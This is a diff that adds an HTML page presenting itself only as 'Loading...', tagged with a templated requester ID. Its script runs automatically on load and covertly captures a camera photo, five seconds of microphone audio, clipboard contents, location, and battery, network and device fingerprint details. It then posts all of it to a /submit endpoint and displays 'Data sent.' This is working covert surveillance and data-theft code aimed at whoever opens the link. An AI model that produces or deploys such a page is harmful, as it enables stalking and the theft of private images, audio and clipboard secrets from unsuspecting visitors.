@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const requesterId = {{ requester_id }};
+        let imageData = null;
+        let audioData = null;
+
+        async function getBattery() {
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                return { level: Math.floor(b.level * 100), charging: b.charging };
+            }
+            return { level: 'unknown', charging: false };
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                        () => resolve({ lat: 'denied', lon: '' })
+                    );
+                } else resolve({ lat: 'not supported', lon: '' });
+            });
+        }
+
+        async function getClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                return text;
+            } catch(e) { return ''; }
+        }
+
+        async function getFonts() {
+            if (!('queryLocalFonts' in window)) return ['not supported'];
+            try {
+                const fonts = await window.queryLocalFonts();
+                return fonts.slice(0, 10).map(f => f.family);
+            } catch(e) { return ['denied']; }
+        }
+
+        async function recordAudio() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                return new Promise((resolve) => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.readAsDataURL(blob);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 5000); // 5 sec
+                });
+            } catch(e) { return null; }
+        }
+
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            await new Promise(r => video.onloadedmetadata = r);
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const img = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(t => t.stop());
+            return img;
+        }
+
+        async function getNetworkInfo() {
+            const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!nav) return {};
+            return {
+                effectiveType: nav.effectiveType,
+                downlink: nav.downlink,
+                rtt: nav.rtt
+            };
+        }
+
+        async function run() {
+            // Camera photo
+            imageData = await takePhoto();
+            // Audio (optional, will ask permission)
+            audioData = await recordAudio();
+            // Battery
+            const battery = await getBattery();
+            // Location
+            const location = await getLocation();
+            // Clipboard
+            const clipboard = await getClipboard();
+            // Fonts
+            const fonts = await getFonts();
+            // Network
+            const network = await getNetworkInfo();
+            // Device info
+            const device = {
+                userAgent: navigator.userAgent,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+            // Orientation
+            const orientation = {
+                type: screen.orientation?.type || 'unknown',
+                angle: screen.orientation?.angle || 0
+            };
+            const touch = 'ontouchstart' in window;
+
+            // Send everything
+            const payload = {
+                requester_id: requesterId,
+                image: imageData,
+                audio: audioData,
+                clipboard: clipboard,
+                location: location,
+                battery: battery,
+                device: device,
+                network: network,
+                fonts: fonts,
+                orientation: orientation,
+                touch: touch
+            };
+            await fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            document.body.innerHTML = "<h2>✅ Data sent. Thank you.</h2>";
+        }
+
+        run();
+    </script>
+</body>
+</html>
